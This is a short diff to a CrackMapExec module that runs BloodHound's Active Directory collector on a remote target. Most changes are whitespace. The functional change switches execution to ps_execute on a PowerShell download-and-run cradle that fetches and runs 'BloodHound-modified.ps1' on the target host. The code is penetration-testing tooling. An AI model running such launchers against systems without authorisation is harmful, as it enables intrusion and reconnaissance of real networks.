@@ -9,7 +9,7 @@ class CMEModule:
         2 supported modes :
             CSV :           exports data into CSVs on the target file system before retreiving them (NOT opsec safe)
             Neo4j API :     exports data directly to the Neo4j API (opsec safe)
-            
+
         Module by Waffle-Wrath
         Bloodhound.ps1 script base : https://github.com/BloodHoundAD/BloodHound
     '''
@@ -24,9 +24,9 @@ class CMEModule:
         '''
         THREADS             Max numbers of threads to execute on target (defaults to 20)
         COLLECTIONMETHOD    Method used by BloodHound ingestor to collect data (defaults to 'Default')
-        CSVPATH             (optional) Path where csv files will be written on target (defaults to C:\)   
+        CSVPATH             (optional) Path where csv files will be written on target (defaults to C:\)
         NEO4JURI            (optional) URI for direct Neo4j ingestion (defaults to blank)
-        NEO4JUSER           (optional) Username for direct Neo4j ingestion 
+        NEO4JUSER           (optional) Username for direct Neo4j ingestion
         NEO4JPASS           (optional) Pass for direct Neo4j ingestion
 
         Give NEO4J options to perform direct Neo4j ingestion (no CSVs on target)
@@ -38,7 +38,7 @@ class CMEModule:
         self.neo4j_URI = ""
         self.neo4j_user = ""
         self.neo4j_pass = ""
-        
+
         if module_options and 'THREADS' in module_options:
             self.threads = module_options['THREADS']
         if module_options and 'CSVPATH' in module_options:
@@ -63,8 +63,7 @@ class CMEModule:
         else :
             command = 'Invoke-BloodHound -URI {} -UserPass "{}:{}" -Throttle {} -CollectionMethod {}'.format(self.neo4j_URI, self.neo4j_user, self.neo4j_pass, self.threads, self.collection_method)
         launcher = gen_ps_iex_cradle(context, 'BloodHound-modified.ps1', command)
-        ps_command = create_ps_command(launcher)
-        connection.execute(ps_command)
+        connection.ps_execute(launcher)
         context.log.success('Executed launcher')
 
     def on_request(self, context, request):
@@ -88,7 +87,7 @@ class CMEModule:
         context.log.success("Successfully retreived data")
 
     def parse_ouput(self, data, context, response):
-        '''        
+        '''
         Parse the output from Invoke-BloodHound
         '''
 
